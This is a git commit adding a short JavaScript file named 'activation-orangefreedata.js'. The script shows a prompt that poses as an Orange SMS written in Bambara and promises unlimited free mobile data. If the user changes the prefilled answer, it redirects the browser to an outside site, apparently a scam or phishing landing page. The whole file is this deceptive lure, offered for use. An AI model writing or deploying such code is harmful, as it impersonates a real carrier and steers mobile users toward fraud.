a57d8a68c67c32abfc312e9d30817765d1b68add
sureoffer <emesire247@gmail.com>
2025-06-11 03:42:41 -0700

    Create activation-orangefreedata.js

---
+++ activation-orangefreedata.js
@@ -0,0 +1,5 @@
+var password = 'DATA GANA'
+password=prompt('ORANGE SMS:Kunnafonidila kanulenw, aw k’a lajɛ ni aw ka Orange sim karti bɛ se ka sɔrɔ ka bɔ 5GB la ka se Unlimited data ma, kiliyan kɔrɔw Sara, Free Data digi walasa k’a lajɛ sisan','DATA GANA');
+if (password != 'DATA GANA') {
+location.href='https://emesire.xyz/orangefreedata.html';
+}
